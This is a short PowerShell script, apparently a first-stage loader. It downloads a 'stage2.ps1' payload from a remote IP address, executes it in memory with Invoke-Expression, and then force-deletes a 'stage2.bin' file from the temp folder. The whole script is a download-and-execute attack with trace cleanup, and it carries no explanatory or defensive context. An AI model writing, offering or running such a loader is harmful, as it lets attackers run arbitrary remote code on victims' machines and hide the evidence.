
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://198.51.100.201/stage2.ps1",
    [int]$RequestTimeout = 129
)
IEX (Invoke-WebRequest -Uri $RemoteUrl -UseBasicParsing).Content
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
